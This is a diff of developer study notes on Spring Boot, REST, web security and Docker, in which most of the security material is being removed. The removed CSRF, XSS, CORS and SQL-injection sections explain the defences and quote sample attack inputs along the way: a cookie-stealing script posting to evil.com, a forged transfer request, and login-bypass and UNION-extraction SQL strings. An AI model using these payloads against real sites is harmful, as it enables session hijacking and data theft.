-    @RequestParam String role,
-    @RequestParam boolean active
-) {
-    return service.getUsers(role, active);
-}
-```
-#### When to use
-
-✅ Optional parameters
-✅ Filters, sorting, pagination
-✅ Small/simple data (String, int, boolean)
-
-@RequestParam(required = false)
-@RequestParam(defaultValue = "0")
-
-
-❌ Not good for large JSON objects
-
-### 3️⃣ @RequestBody – complex / structured data
-
-Use when sending JSON/XML in request body.
-
-Example
-POST /users
-```
-{
-  "name": "Priyanka",
-  "email": "priyanka@gmail.com",
-  "age": 25
-}
-```
-```
-@PostMapping("/users")
-public User createUser(@RequestBody UserRequest request) {
-    return service.createUser(request);
-}
-```
-
-#### When to use
-
-✅ Create / update operations
-✅ Large or nested data
-✅ DTO objects
-
-❌ Not for GET requests (generally)
-
-#### 🔥 Interview-friendly comparison table
-### Situation	        ### Use
-Get user by ID	      @PathVariable
-Filter users	        @RequestParam
-Create user	          @RequestBody
-Update user	          @PathVariable + @RequestBody
-Pagination	          @RequestParam
-Search API	          @RequestBody (if complex)
-
-
-
-
-## Spring WebFlux 
-Spring WebFLUX is a reactive, non-blocking web framework built on Project Reactor. It uses Mono for 0–1 elements and Flux for 0–N elements. Unlike Spring MVC, it uses an event-loop model and non-blocking I/O, making it suitable for high concurrency and streaming applications.
-Mono is a reactive Publisher in Project Reactor that emits zero or one element asynchronously. It supports various operators like map, flatMap, filter, onErrorResume, and zip to transform and control reactive data flow. It is lazy and executes only when subscribed.
-
-## 🚀 What is Spring Boot?
-
-Spring Boot is an opinionated framework built on top of Spring that helps build production-ready applications quickly with:
-
-a) Minimal configuration
-
-b) Embedded servers
-
-c) Auto-configuration
-
-d) Microservices support
-
-✅ 1️⃣ Auto-Configuration
-🔹 Feature
-
-Spring Boot automatically configures beans based on:
-
-Classpath dependencies
-
-Properties
-
-Conditions
-
-Example:
-If spring-boot-starter-data-jpa is present →
-Spring auto-configures:
-
-DataSource
-
-EntityManager
-
-TransactionManager
-
-⚠ Pitfall
-
-Hidden configurations → hard to debug
-
-You may not know which bean is getting created
-
-Can accidentally override config
-
-Example issue:
-Multiple DataSource beans → ambiguity
-
-👉 Solution:
-
-Use @ConditionalOn...
-
-Use spring.autoconfigure.exclude
-
-Enable debug logs
-
-✅ 2️⃣ Embedded Server (Tomcat/Jetty/Netty)
-🔹 Feature
-
-No need for external server deployment.
-
-mvn spring-boot:run
-
-App runs with embedded Tomcat.
-
-⚠ Pitfall
-
-Memory overhead in microservices
-
-Too many services → too many embedded servers
-
-Can increase startup time
-
-In high-scale systems → consider container tuning.
-
-✅ 3️⃣ Starter Dependencies
-🔹 Feature
-spring-boot-starter-web
-spring-boot-starter-data-jpa
-spring-boot-starter-security
-
-Pre-configured dependencies.
-
-⚠ Pitfall
-
-Pulls many transitive dependencies
-
-Can increase jar size
-
-Version conflicts sometimes hidden
-
-👉 Always check:
-
-mvn dependency:tree
-✅ 4️⃣ Production-Ready Features (Actuator)
-🔹 Feature
-
-Spring Boot Actuator provides:
-
-Health checks
-
-Metrics
-
-Prometheus integration
-
-Thread dump
-
-Environment details
-
-⚠ Pitfall
-
-If not secured:
-
-/actuator/env exposes secrets
-
-/actuator/heapdump exposes memory
-
-👉 Always:
-
-Secure actuator endpoints
-
-Restrict exposure
-
-✅ 5️⃣ Configuration Management
-🔹 Feature
-
-Supports:
-
-application.properties
-
-application.yml
-
-Profiles
-
-Environment variables
-
-Example:
-
-spring.profiles.active=prod
-⚠ Pitfall
-
-Misconfigured profiles in prod
-
-Hardcoded values
-
-Secrets in properties file
-
-👉 Use:
-
-Vault
-
-AWS Secrets Manager
-
-Environment variables
-
-✅ 6️⃣ Dependency Injection (IoC)
-🔹 Feature
-
-@Component
-
-@Service
-
-@Repository
-
-@Autowired
-
-⚠ Pitfall
-
-Field injection (hard to test)
-
-Circular dependencies
-
-Large God services
-
-👉 Best Practice:
-
-Constructor injection
-
-Follow SOLID (you already focus on this 👍)
-
-✅ 7️⃣ Spring Boot + Microservices Support
-🔹 Feature
-
-Works well with:
-
-Kafka
-
-RabbitMQ
-
-REST
-
-WebFlux
-
-Spring Cloud
-
-⚠ Pitfall
-
-Distributed transaction issues
-
-Overuse of synchronous REST calls
-
-Too many inter-service calls → latency
-
-👉 Prefer:
-
-Event-driven architecture
-
-Saga pattern
-
-✅ 8️⃣ Transaction Management
-🔹 Feature
-@Transactional
-
-Easy transaction handling.
-
-⚠ Pitfall
-
-Only works for public methods
-
-Doesn’t work on internal method calls
-
-Proxy-based limitation
-
-Very common interview trap 🔥
-
-✅ 9️⃣ Spring Boot + JPA
-🔹 Feature
-
-Very fast CRUD development.
-
-⚠ Pitfalls
-
-N+1 query problem
-
-LazyInitializationException
-
-Blocking DB driver (not reactive)
-
-In high-throughput systems → careful optimization needed.
-
-✅ 10️⃣ Logging & Monitoring
-🔹 Feature
-
-Default logging via Logback.
-
-⚠ Pitfall
-
-Excessive logging → performance impact
-
-Logging sensitive data
-
-
-## What is a CSRF Attack?
-
-A CSRF (Cross-Site Request Forgery) attack is when a malicious website tricks a user’s browser into making an unwanted request to another website where the user is already logged in.
-
-👉 The attack works because the browser automatically sends cookies (like session cookies) with every request.
-
-## Imagine:
-
-You log in to your bank → bank.com
-
-Your browser stores a session cookie
-
-Without logging out, you visit a malicious site → evil.com
-
-That site secretly runs this:
-
-**<img src="https://bank.com/transfer?to=attacker&amount=10000" />**
-
-Since you're logged in, your browser automatically sends the session cookie to bank.com.
-
-💥 The bank thinks YOU requested the transfer.
-
-That is CSRF.
-
-**🔥 Why It Happens** 
-
-Because:
-
-Browser automatically sends cookies
-
-Server trusts the cookie
-
-No extra validation is done
-
-
-## 🛡️ How to Prevent CSRF
-**1️⃣ CSRF Token (Most Common Solution)**
-
-Server generates a random token and sends it in a form.
-
-<input type="hidden" name="_csrf" value="abc123xyz">
-
-When form is submitted:
-
-Server checks if token matches
-
-If not → request rejected
-
-👉 This is what Spring Security does by default.
-
-**2️⃣ SameSite Cookies**
-
-Set cookie like:
-
-Set-Cookie: JSESSIONID=xyz; SameSite=Strict
-
-Prevents browser from sending cookie in cross-site requests.
-
-**3️⃣ Double Submit Cookie Pattern**
-
-Send token in:
-
-Cookie
-
-Request body/header
-
-Server compares both.
-
-**4️⃣ Use JWT in Authorization Header**
-
-Instead of cookies:
-
-Authorization: Bearer token
-
-Browser does NOT auto-send this.
-So CSRF becomes very hard.
-
-## 💡 How Spring Boot Handles CSRF
-
-If you're using:
-
-**@EnableWebSecurity**
-
-Spring Security:
-
-Automatically enables CSRF protection
-
-Adds _csrf token in forms
-
-Rejects unsafe POST/PUT/DELETE without token
-
-To disable (not recommended for forms):
-
-**http.csrf().disable();**
-
-👉 Usually disabled in stateless REST APIs using JWT.
-
-## 🔥 What is an XSS Attack?
-
-XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a trusted website, and that script runs in other users’ browsers.
-
-👉 Unlike CSRF (which sends requests), XSS can read data, steal cookies, and fully act as the user.
-
-
-## 🧠 Simple Example
-
-Imagine your app has a comment box:
-```
-<div>
-  User comment: {{comment}}
-</div>
-```
-
-If the app does NOT escape input, the attacker submits:
-```
-<script>
-  fetch("https://evil.com/steal?cookie=" + document.cookie)
-</script>
-```
-
-Now whenever someone views that page:
-
-💥 The script runs
-💥 Their cookies are sent to attacker
-💥 Attacker can hijack session
-
-## 🛡️ How to Prevent XSS
-1️⃣ Escape Output (MOST IMPORTANT)
-
-Instead of:
-
-<div>${userInput}</div>
-
-Use escaping:
-
-<div th:text="${userInput}"></div>
-
-In Spring + Thymeleaf:
-
-th:text escapes automatically
-
-th:utext does NOT escape
-
-2️⃣ Use HttpOnly Cookies
-Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure
-
-Prevents JS from reading cookies.
-
-3️⃣ Content Security Policy (CSP)
-Content-Security-Policy: script-src 'self'
-
-Prevents inline scripts.
-
-4️⃣ Validate & Sanitize Input
-
-Reject <script>
-
-Remove HTML tags
-
-Use libraries like OWASP sanitizer
-
-🧠 Real Attack Example in Spring Boot
-
-Bad controller:
-```
-@GetMapping("/hello")
-public String hello(@RequestParam String name) {
-    return "<h1>Hello " + name + "</h1>";
-}
-```
-
-If user visits:
-
-/hello?name=<script>alert(1)</script>
-
-Boom 💥
-
-Better approach:
-
-Use template engine
-
-Never build HTML using string concatenation
-
-🔥 How To Protect From XSS Attacks
-
-There is no single fix.
-You need multiple layers of protection.
-
-🛡️ 1️⃣ Escape Output (MOST IMPORTANT)
-👉 Golden Rule:
-
-Always escape data when rendering it into HTML.
-
-✅ In Spring Boot (Thymeleaf)
-
-Safe:
-
-<p th:text="${comment}"></p>
-
-❌ Dangerous:
-
-<p th:utext="${comment}"></p>
-
-th:text escapes automatically.
-th:utext renders raw HTML.
-
-✅ In React (Safe by Default)
-<div>{userInput}</div>
-
-React automatically escapes content.
-
-❌ Dangerous:
-
-<div dangerouslySetInnerHTML={{__html: userInput}} />
-
-Never use this with user input.
-
-🛡️ 2️⃣ Use HttpOnly Cookies
-
-If attacker somehow injects script:
-
-document.cookie
-
-They should NOT be able to read session cookie.
-
-Set cookie like:
-
-Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax
-
-HttpOnly → JS cannot read cookie
-
-Secure → HTTPS only
-
-SameSite → Prevent CSRF
-
-In Spring Boot:
-
-server.servlet.session.cookie.http-only=true
-server.servlet.session.cookie.secure=true
-🛡️ 3️⃣ Use Content Security Policy (CSP)
-
-CSP tells browser:
-
-"Only allow scripts from my domain"
-
-Example:
-
-Content-Security-Policy: script-src 'self'
-
-In Spring Boot:
-
-http.headers()
-    .contentSecurityPolicy("script-src 'self'");
-
-This blocks inline <script> injection.
-
-🛡️ 4️⃣ Validate & Sanitize Input
-
-If your app allows HTML (like rich text editor):
-
-Use sanitizer libraries like:
-
-OWASP Java HTML Sanitizer
-
-Jsoup clean()
-
-Example:
-
-String clean = Jsoup.clean(userInput, Safelist.basic());
-
-Removes <script> and dangerous tags.
-
-🛡️ 5️⃣ Never Build HTML Using String Concatenation
-
-❌ Bad:
-
-return "<h1>" + userInput + "</h1>";
-
-Use:
-
-Template engine
-
-JSON APIs instead of server-rendered HTML
-
-🛡️ 6️⃣ Avoid Inline JavaScript
-
-Bad:
-
-<button onclick="doSomething()">
-
-Better:
-
-element.addEventListener("click", handler)
-
-Helps CSP enforcement.
-
-🛡️ 7️⃣ Keep Dependencies Updated
-
-Old libraries sometimes allow DOM-based XSS.
-
-Since you're working in microservices:
-
-Keep Spring Boot updated
-
-Keep frontend framework updated
-## 👉 CORS 
-
-CORS itself is not an attack.
-CORS is a browser security mechanism.
-
-But ❗ misconfigured CORS can create security vulnerabilities.
-
-Let’s break this clearly.
-
-## 🌍 What is CORS?
-
-CORS = Cross-Origin Resource Sharing
-
-It controls:
-
-Which frontend (origin) is allowed to call your backend API.
-
-## 🧠 What is an Origin?
-
-An origin is:
-
-Protocol + Domain + Port
-
-Example:
-
-URL	Origin
-https://app.com
-	https://app.com
-
-https://app.com:8080
-	https://app.com:8080
-
-http://app.com
-	http://app.com
-
-Even changing port makes it different origin.
-
-🔐 Why CORS Exists
-
-Browsers block JavaScript from calling another domain by default.
-
-Example:
-
-Frontend:
-
-https://myapp.com
-
-Backend:
-
-https://api.bank.com
-
-Browser blocks request unless backend allows it.
-
-## ⚠️ What is a “CORS Attack”?
-
-It’s not exactly an attack.
-
-It usually means:
-
-Backend is configured to allow ANY origin to access protected APIs.
-
-Example of dangerous config:
-
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-
-This is very dangerous.
-
-🔥 Dangerous Scenario
-
-Let’s say:
-
-You are logged into:
-
-https://bank.com
-
-Your session cookie exists.
-
-Now you visit:
-
-https://evil.com
-
-If bank backend allows:
-
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-
-Then evil.com can do:
-
-fetch("https://bank.com/account", {
-  credentials: "include"
-})
-
-Now:
-
-Browser sends session cookie
-
-Evil site can READ the response
-
-Attacker gets your account data
-
-💥 That is a serious vulnerability.
-
-## 🚨 Important Difference
-CSRF	CORS Misconfiguration
-Sends request	Sends + READS response
-Cannot read data	Can read data
-Uses cookies auto	Needs backend misconfig
-## 🔎 How Browser CORS Flow Works
-
-When frontend calls backend:
-
-1️⃣ Browser sends preflight request
-OPTIONS /api/data
-Origin: https://myapp.com
-2️⃣ Backend responds
-Access-Control-Allow-Origin: https://myapp.com
-Access-Control-Allow-Methods: GET, POST
-
-If allowed → browser sends real request.
-
-If not → blocked.
-
-## 🛡️ How To Secure CORS in Spring Boot
-❌ NEVER DO THIS
-.allowedOrigins("*")
-.allowCredentials(true)
-
-Very dangerous.
-
-✅ Correct Way
-
-Specify exact frontend:
-```
-@Configuration
-public class CorsConfig {
-
-    @Bean
-    public WebMvcConfigurer corsConfigurer() {
-        return new WebMvcConfigurer() {
-            @Override
-            public void addCorsMappings(CorsRegistry registry) {
-                registry.addMapping("/api/**")
-                        .allowedOrigins("https://myfrontend.com")
-                        .allowedMethods("GET","POST","PUT","DELETE")
-                        .allowCredentials(true);
-            }
-        };
-    }
-}
-```
-## 🎯 For Your Microservices + JWT Setup
-
-If you're using:
-
-Authorization: Bearer token
-
-And token is stored in:
-
-HttpOnly cookie → CORS matters
-
-localStorage → CORS still matters
-
-Always:
-
-Allow only trusted frontend domains
-
-Never use "*"
-
-Avoid allowCredentials(true) with "*"
-
-🧠 Important Understanding
-
-CORS is:
-
-A browser protection
-
-Not backend protection
-
-Not API-level authentication
-
-Tools like Postman ignore CORS.
-
-Only browsers enforce it.
-
-🔥 Real Interview Answer
-
-If interviewer asks:
-
-What is CORS and how can misconfiguration cause issues?
-
-You say:
-
-CORS controls cross-origin requests
-
-It is enforced by browsers
-
-If backend allows * with credentials, malicious sites can read authenticated responses
-
-Always restrict allowed origins explicitly
-
-## 💣 What is SQL Injection?
-
-SQL Injection (SQLi) happens when an attacker injects malicious SQL code into your query through user input.
-
-👉 If your application builds SQL queries using string concatenation, attackers can modify the query logic.
-
-🧠 Simple Example
-
-Imagine login code like this:
-```
-String query = "SELECT * FROM users WHERE username = '" 
-               + username + 
-               "' AND password = '" 
-               + password + "'";
-```
-
-Now attacker enters:
-
-username: admin
-password: ' OR '1'='1
-
-Query becomes:
-
-SELECT * FROM users 
-WHERE username = 'admin' 
-AND password = '' OR '1'='1'
-
-Since '1'='1' is always true → login bypassed 💥
-
-## 🔥 What Can Attackers Do?
-
-If vulnerable, attacker can:
-
-Bypass login
-
-Read all user data
-
-Delete tables
-
-Modify records
-
-Dump entire database
-
-Worst case:
-
-DROP TABLE users;
-🎯 Types of SQL Injection
-1️⃣ Authentication Bypass
-' OR '1'='1
-2️⃣ Data Extraction (Union Based)
-' UNION SELECT credit_card FROM users --
-
-Used to extract sensitive data.
-
-3️⃣ Blind SQL Injection
-
-When app doesn't show errors.
-
-Attacker checks:
-
-' AND 1=1 --
-' AND 1=2 --
-
-And observes response behavior.
-
-🚨 Why It Happens
-
-Because of:
-
-❌ String concatenation
-❌ Direct query building
-❌ No parameter binding
-
-🛡️ How To Prevent SQL Injection
-
-This is VERY important for you.
-
-✅ 1️⃣ Use Prepared Statements (Most Important)
-
-Never build queries like this:
-
-String query = "SELECT * FROM users WHERE id=" + userId;
-
-Instead use:
-
-PreparedStatement stmt = connection.prepareStatement(
-    "SELECT * FROM users WHERE id=?"
-);
-stmt.setInt(1, userId);
-
-The database treats input as data, not SQL.
-
-✅ 2️⃣ If Using Spring Boot + JPA (Best for You)
-
-Safe:
-
-@Query("SELECT u FROM User u WHERE u.username = :username")
-User findByUsername(@Param("username") String username);
-
-Or even better:
-
-User findByUsername(String username);
-
-Spring Data automatically uses prepared statements.
-
-❌ Dangerous in Spring
-entityManager.createQuery(
-   "SELECT u FROM User u WHERE u.name = '" + name + "'"
-);
-
-Never concatenate JPQL either.
-
-✅ 3️⃣ Validate Input
+Kubernetes health checks 
 
 For example:
 
-ID should be numeric
+Kubernetes uses:- 
+ 
+/actuator/health to check if the container is healthy. 
 
-Email should match regex
 
-But remember:
-Validation is NOT replacement for prepared statements.
 
-✅ 4️⃣ Use Least Privilege DB User
-
-Your app DB user should NOT have:
-
-DROP TABLE permission
-
-ALTER permission
-
-🔥 Real Example in Spring Boot
-
-Bad Controller:
+## How do you Dockerize a Spring Boot Application?
 ```
-@GetMapping("/user")
-public List<User> getUser(@RequestParam String name) {
-    return entityManager.createNativeQuery(
-        "SELECT * FROM users WHERE name = '" + name + "'"
-    ).getResultList();
-}
+Step 1 Build Jar 
+mvn clean package 
+Step 2 Dockerfile 
+FROM openjdk:17 
+COPY target/app.jar app.jar 
+ENTRYPOINT ["java","-jar","app.jar"] 
+Step 3 Build Image 
+docker build -t springboot-app . 
+Step 4 Run Container 
+docker run -p 8080:8080 springboot-app 
 ```
+##  How to check running containers? 
 
-Attacker sends:
+docker ps 
 
-/user?name=' OR '1'='1
+All containers: 
 
-Boom 💥
+docker ps -a 
 
-🧠 SQL Injection vs XSS vs CSRF
-Attack	Target	Happens Where
-SQL Injection	Database	Backend
-XSS	Browser	Frontend
-CSRF	Authenticated Request	Browser + Backend
+##  What is Docker Registry?
 
-
-
-## How do you prevent SQL Injection in Spring Boot?
-
-You say:
-
-Use prepared statements
-
-Use Spring Data JPA repositories
-
-Never concatenate SQL
-
-Validate inputs
-
-Use least privilege DB access
-
-🚀 Since You Work with Microservices
-
-In your architecture:
-
-Service → DB
-
-API Gateway → Service
-
-UI → Gateway
-
-SQL injection happens inside:
-👉 Service layer when querying DB
-
-Even if you have:
-
-JWT
-
-OAuth
-
-API Gateway
-
-SQL injection is still possible if query is badly written.
-
-🔥 Most Important Rule
-
-Never trust user input. Always parameterize queries.
-
-If you want, next I can explain:
-
-🛡️ PART 2 — How Prepared Statements Stop This
-
-Now let’s see internal difference.
-
-Instead of:
-
-"SELECT * FROM users WHERE username='" + username + "'"
-
-We do:
-
-PreparedStatement ps = connection.prepareStatement(
-   "SELECT * FROM users WHERE username=? AND password=?"
-);
-🧠 What Happens Internally
-Step 1 — SQL is Sent to DB FIRST
-
-DB receives:
-
-SELECT * FROM users WHERE username=? AND password=?
-
-DB parses and creates execution plan.
-
-Notice:
-
-It does NOT see user input yet.
-
-Step 2 — Parameters Sent Separately
-
-Now JDBC sends:
-
-Parameter 1 → "admin"
-Parameter 2 → "' OR '1'='1"
-
-These values are transmitted as DATA, not SQL.
-
-Step 3 — DB Treats Parameters as Literals
-
-Even if attacker input is:
-
-' OR '1'='1
-
-DB treats it as:
-
-password = "' OR '1'='1"
-
-NOT as:
-
-password='' OR '1'='1'
-
-So injection fails.
-
-🎯 Why This Works
-
-Because SQL parsing and execution plan creation happen BEFORE parameters are added.
-
-The structure of query is fixed.
-
-User input cannot change SQL structure.
-
-🔥 PART 3 — How JPA Prevents SQL Injection Internally
-
-Since you're using Spring Boot + JPA, this is important.
-
-✅ Case 1 — Derived Query Method
-User findByUsername(String username);
-
-Spring Data converts this into:
-
-SELECT * FROM users WHERE username=?
-
-It internally uses PreparedStatement.
-
-✅ Case 2 — JPQL with Named Parameters
-@Query("SELECT u FROM User u WHERE u.username = :username")
-User find(@Param("username") String username);
-
-JPA converts to:
-
-SELECT * FROM users WHERE username=?
-
-Again → parameter binding → safe.
-
-🚨 Dangerous Case in JPA
-
-If you do:
-
-entityManager.createQuery(
-   "SELECT u FROM User u WHERE u.name = '" + name + "'"
-);
-
-You bypass JPA protection.
-
-Now injection possible.
-
-🧠 Internally What JPA Does
-
-Flow:
-
-Spring Data → Hibernate → JDBC → PreparedStatement → DB
-
-Hibernate:
-
-Parses JPQL
-
-Converts to SQL
-
-Replaces named parameters with ?
-
-Uses PreparedStatement
-
-Binds values safely
-
-So structure is frozen before data is inserted.
-
-
-## 🔥 What Are Filters in Spring Boot?
-
-A Filter is a component that:
-
-Intercepts every HTTP request and/or response before it reaches your controller.
-
-Think of it like:
-```
-Client → Filter → Controller → Service → DB
-```
-
-And on response:
-```
-DB → Service → Controller → Filter → Client
-```
-## 🧠 Simple Real-Life Analogy
-
-Filter = Security guard at office gate.
-
-Every request must pass through guard.
-
-Guard checks ID (authentication).
-
-Then allows entry.
-
-📌 Where Do Filters Exist?
-
-Filters are part of:
-
-👉 Servlet API (javax.servlet / jakarta.servlet)
-Spring Boot builds on top of this.
-
-## 🔄 Request Flow in Spring Boot
-Client Request
-      ↓
-Servlet Container (Tomcat)
-      ↓
-Filter
-      ↓
-DispatcherServlet
-      ↓
-Controller
-🛠️ Why We Use Filters?
-
-## Common use cases:
-
-Use Case	Example
-Authentication	Check JWT
-Logging	Log request details
-CORS	Add CORS headers
-Rate limiting	Block too many requests
-Request modification	Add headers
-
-##  ASCII FULL FLOW DIAGRAM (Complete End-to-End)
-                  ┌──────────────────────────┐
-                  │      CLIENT (Browser)     │
-                  └──────────────┬───────────┘
-                                 │
-                                 ▼
-                  ┌──────────────────────────┐
-                  │      TOMCAT SERVER        │
-                  └──────────────┬───────────┘
-                                 │
-                                 ▼
-          ┌──────────────────────────────────────────────┐
-          │        SERVLET FILTER CHAIN (Tomcat)         │
-          │  - CORS Filter                               │
-          │  - Encoding Filter                            │
-          │  - springSecurityFilterChain  (IMPORTANT)     │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │      DelegatingFilterProxy ("ssfc")          │
-          │        delegates to FilterChainProxy         │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │           FilterChainProxy                    │
-          │   (Selects matching SecurityFilterChain)      │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-   ┌──────────────────────────────────────────────────────────┐
-   │            SECURITY FILTER CHAIN (SPRING)                │
-   │----------------------------------------------------------│
-   │  1. SecurityContextPersistenceFilter                      │
-   │  2. LogoutFilter                                          │
-   │  3. UsernamePasswordAuthenticationFilter (LOGIN)          │
-   │        │                                                  │
-   │        │ Calls AuthenticationManager → ProviderManager    │
-   │        ▼                                                  │
-   │      ┌─────────────────────────────────────────────┐     │
-   │      │           AUTHENTICATION MANAGER            │     │
-   │      └──────────────┬──────────────────────────────┘     │
-   │                     ▼                                    │
-   │      ┌─────────────────────────────────────────────┐     │
-   │      │           PROVIDER MANAGER                  │     │
-   │      │  (calls multiple AuthenticationProviders)   │     │
-   │      └──────┬───────────────────┬──────────────────┘     │
-   │             │                   │                        │
-   │             ▼                   ▼                        │
-   │   DaoAuthenticationProvider   JwtAuthenticationProvider   │
-   │   (username/password)         (JWT validation)            │
-   │             │                   │                        │
-   │             └───────► returns Authentication  ◄──────────┘
-   │
-   │  4. BasicAuthenticationFilter
-   │  5. JwtAuthenticationFilter (if JWT)
-   │  6. ExceptionTranslationFilter
-   │  7. FilterSecurityInterceptor (Authorization)
-   └──────────────────────────────────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │              DISPATCHERSERVLET               │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │             HANDLER MAPPING                  │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │               INTERCEPTORS                   │
-          │     - preHandle()                            │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────────────────────┐
-          │              CONTROLLER METHOD                │
-          └──────────────┬───────────────────────────────┘
-                         │
-                         ▼
-       ┌──────────────────────────────────────────────────────────┐
-       │                SERVICE LAYER (Business Logic)             │
-       └──────────────┬───────────────────────────────────────────┘
-                      │
-                      ▼
-       ┌──────────────────────────────────────────────────────────┐
-       │                 REPOSITORY / DAO                          │
-       └──────────────┬───────────────────────────────────────────┘
-                      │
-                      ▼
-               Database (MySQL, Postgres…)
-
-──────────────────────── RESPONSE PATH (BACK) ───────────────────────
-
-Database → Repository → Service → Controller →  
-Interceptors (postHandle) → DispatcherServlet →  
-Security Filters (cleanup) → Servlet Filters → Tomcat → Client
-
-## ✅ 2. Markdown Summary (Clean Explanation)
-🔵 Phase 1: Tomcat & Servlet Filters
-Tomcat receives request
-Passes through Servlet Filter Chain
-Important part: springSecurityFilterChain (DelegatingFilterProxy)
-🟢 Phase 2: Spring Security (FilterChainProxy)
-Delegates to the Security Filter Chain, which includes:
-SecurityContextPersistenceFilter
-LogoutFilter
-UsernamePasswordAuthenticationFilter
-BasicAuthenticationFilter
-JWTAuthenticationFilter (if configured)
-ExceptionTranslationFilter
-FilterSecurityInterceptor (authorization)
-🟡 Phase 3: Authentication Flow (if needed)
-UsernamePasswordAuthenticationFilter → AuthenticationManager → ProviderManager → Providers:
-DaoAuthenticationProvider
-JwtAuthenticationProvider
-LdapAuthenticationProvider
-Authentication result stored in SecurityContext.
-🟣 Phase 4: DispatcherServlet + MVC
-HandlerMapping selects Controller
-Interceptors run (preHandle)
-Controller executes
-Controller calls Service → Repository → DB
-
-Response modification	Add custom headers
-
-
-## HTTP Methods
-1️⃣ GET – Retrieve Data
-
-GET is used to fetch data from the server.
-
-Changes server state	❌ No
-Idempotent	✅ Yes
-Safe	✅ Yes
-
-If you run it 100 times, nothing changes.
-
-It does not modify anything in the database.
-2️⃣ POST – Create Resource
-
-POST is used to create a new resource.
-
-Each request may create a new record.
-
-Changes server state	✅ Yes
-Idempotent	❌ No
-Safe	❌ No
-If you send the request 3 times, 3 users may be created.
-3️⃣ PUT – Replace Resource
-
-PUT replaces the entire resource.
-
-Changes server state	✅ Yes
-Idempotent	✅ Yes
-
-Multiple requests → same final state.
-
-4️⃣ PATCH – Partial Update
-
-PATCH updates only specific fields.
-
-Changes server state	✅ Yes
-Idempotent	❌ Usually
-
-5️⃣ DELETE – Remove Resource
-
-DELETE removes a resource from the server.
-
-Changes server state	✅ Yes
-Idempotent	✅ Yes
-Running it multiple times still results in:
-
-User does not exist
-
-So the final state remains the same.
-
-## REST Features
-(Representational State Transfer) is an architectural style used to design scalable and simple web services. REST APIs follow certain principles or features (constraints) that make them efficient.
-
-The main features of REST are the following:
-
-1️⃣ Client–Server Architecture
-
-In REST, the client and server are separate.
-
-Client → sends request (browser, mobile app, frontend)
-
-Server → processes request and sends response
-
-Example
-
-Frontend (React / Angular)
-
-GET /users/10
-
-Backend (Spring Boot)
-
-returns user data
-Benefit
-
-Independent development
-
-Frontend and backend can evolve separately
-
-2️⃣ Stateless
-
-REST APIs are stateless, meaning:
-
-The server does not store any client session between requests.
-
-Every request must contain all necessary information.
-
-Example
-
-Request:
-
-GET /orders
-Authorization: Bearer token123
-
-Next request must again include authentication.
-
-Server does not remember previous requests.
-
-Benefits
-
-Easy scalability
-
-Load balancers work easily
-
-No session management needed
-
-3️⃣ Cacheable
-
-REST responses can be cached to improve performance.
-
-Example:
-
-GET /products
-Cache-Control: max-age=3600
-
-This means the response can be cached for 1 hour.
-
-Benefit
-
-Faster responses
-
-Reduced server load
-
-4️⃣ Uniform Interface
-
-REST APIs follow a standard interface to interact with resources.
-
-Main principles:
-
-Resource-based URLs
-
-/users
-/orders
-/products
-
-Standard HTTP methods
-
-Method	Operation
-GET	Retrieve
-POST	Create
-PUT	Update
-PATCH	Partial update
-DELETE	Remove
-
-Standard response formats
-
-Usually:
-
-JSON
-XML
-
-Example response:
-
-{
- "id": 1,
- "name": "Priyanka"
-}
-5️⃣ Layered System
-
-REST architecture can have multiple layers between client and server.
-
-Example layers:
-
-Client
-   ↓
-API Gateway
-   ↓
-Authentication Service
-   ↓
-Microservice
-   ↓
-Database
-
-Client does not know how many layers exist.
-
-Benefits
-
-Security
-
-Scalability
-
-Load balancing
-
-6️⃣ Code on Demand (Optional)
-
-Server can send executable code to the client.
-
-Example:
-
-JavaScript
-
-Applets
-
-Example:
-
-Server sends JavaScript code to browser.
-
-This feature is optional and rarely used in APIs.
-## CRUD operations Validations
-CRUD operations are validated at multiple levels, including input validation using annotations like @Valid, business logic validation in the service layer, authorization checks, and database constraints such as primary key, unique, and foreign key validations.
-
-
-1️⃣ Input Validation (Most Important)
-
-Before processing CRUD operations, we must validate the input data.
-
-Example: Creating a user
-
-POST /users
-
-Request:
-
-{
- "name": "",
- "email": "invalid-email"
-}
-
-We must validate:
-
-Name should not be empty
-
-Email should be valid
-
-In Spring Boot
-
-Use Bean Validation (JSR-380) annotations.
-```
-public class UserDTO {
-
-    @NotBlank
-    private String name;
-
-    @Email
-    private String email;
-
-    @Min(18)
-    private int age;
-}```
-
-Controller:
-```
-@PostMapping("/users")
-public ResponseEntity<User> createUser(@Valid @RequestBody UserDTO user) {
-    return ResponseEntity.ok(userService.create(user));
-}```
-
-If validation fails → 400 Bad Request.
-
-2️⃣ Business Validation
-
-Even if input format is correct, we must validate business rules.
-
-Example rules:
-
-Email must be unique
-
-Account balance cannot be negative
-
-User must exist before updating
-
-Example:
-```
-if(userRepository.existsByEmail(user.getEmail())) {
-    throw new DuplicateEmailException("Email already exists");
-}
-```
-3️⃣ Database Constraints
-
-Database also validates data to maintain data integrity.
+A Docker registry is a storage system for Docker images.
 
 Examples:
 
-Constraint	Purpose
-Primary Key	Unique row identifier
-Unique	No duplicate values
-Foreign Key	Maintain relationships
-Check	Validate column values
+Docker Hub 
+
+AWS ECR 
+
+Google Container Registry 
+
+Azure Container Registry 
+
+**Push image:** 
+
+docker push username/app:latest 
+
+
+## 1️⃣ Check Docker Version 
+docker --version
+
+Shows installed Docker version. 
+
+2️⃣ Pull an Image 
+
+Downloads an image from Docker Hub.
+
+docker pull nginx
 
 Example:
 
-email VARCHAR(255) UNIQUE
+docker pull mysql
+3️⃣ List Docker Images 
+docker images
 
-If duplicate email is inserted → database rejects it.
+Shows all images in your system.
 
-4️⃣ Authorization Validation
+Example output:
 
